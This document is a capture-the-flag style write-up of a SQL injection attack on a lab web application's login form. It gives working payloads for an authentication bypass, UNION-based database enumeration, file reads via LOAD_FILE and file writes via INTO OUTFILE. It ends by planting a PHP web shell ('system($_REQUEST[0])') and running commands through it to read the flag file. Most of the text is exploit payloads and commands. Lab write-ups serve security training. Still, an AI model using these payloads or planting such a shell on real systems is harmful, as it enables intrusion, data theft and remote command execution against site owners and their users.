With Burp suite, fuzz the username and password for SQL injection.

1) Create a proxy in the proxy section
2) Send the requests to the target website
3) Capture the requests and send them to the Intruder module
4) Select the wordlist from `/usr/share/wfuzz/wordlist/Injections`
5) Run the fuzzer and see which combinations generate errors

This combination works:

``` 
' or 0=0 # 
```

Get database info:

```
' UNION SELECT 1,2,3,4,@@version -- -
```

Column 1 is discarded by the database, columns 2,3,4,5 are displayed.
Unions can be done with 6 fields ignoring the first one.

Using: 

```
cn' UNION SELECT 1,2,3,4, user() -- -
```

The resulting user is `root@localhost`

Being root we can read and write everywhere, if the DB user has file read/write permissions.
We probe for file read permission:

```
a' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboard/dashboard.php"),3,4,5-- -	
```

This works, so the user can read files. 
Now probing for write permission.

```
cn' UNION SELECT 1,2,3,4,'file written successfully!' into outfile '/var/www/html/dashboard/proof.txt' -- -
```

And it works. Now we can create a PHP web shell. This way we can navigate the system and find the flag. This query works.

```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
```

Once the shell is deployed, we can send shell commands as param 0:

http://mod33sec518:32695/dashboard/shell.php?0=ls%20/

This reveals that there is a flag_cae1dadcd174.txt file in the root directory.

http://mod33sec518:32695/dashboard/shell.php?0=cat%20/flag_cae1dadcd174.txt

Will show the flag.
Actually the flag can also be retrieved via:

```
a' UNION SELECT 1, LOAD_FILE("/flag_cae1dadcd174.txt"),3,4,5-- -	
```

This works but guessing the file name would be impossible so a shell was necessary to find the file name for the flag.